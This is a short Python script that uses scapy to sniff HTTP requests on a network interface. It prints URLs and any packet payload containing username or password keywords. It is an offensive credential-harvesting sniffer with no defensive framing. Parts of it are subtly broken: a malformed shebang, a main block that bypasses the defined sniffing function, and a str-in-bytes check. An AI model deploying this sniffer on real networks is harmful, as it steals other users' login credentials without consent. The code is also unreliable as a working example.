#!/usr/bin/env_python
import re
import subprocess

from scapy.layers import http
from scapy.packet import Raw
from scapy.sendrecv import sniff


def sniffing(interface):
    sniff(iface=interface, store=False, prn=packet_http_filter)


def packet_http_filter(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print(url)
        if packet.haslayer(Raw):
            load = packet[Raw].load
            keywords = ["user", "name", "username", "userid", "usr", "login", "uid", "id", "password", "pass"]
            for word in keywords:
                if word in load:
                    print(load)
                    break


def get_current_interface():
    """The function shows all interfaces in system"""
    ifconfig_result = subprocess.check_output(["sudo", "ifconfig"])
    interface_result = re.findall(r"\b\w+(?=:\s)", ifconfig_result.decode('utf-8'))
    if interface_result:
        return ", ".join(interface_result)
    else:
        print("Could not read interfaces")


if __name__ == "__main__":
    print("Interfaces of this machine: " + get_current_interface())
    sniff(input("Enter interface: "))
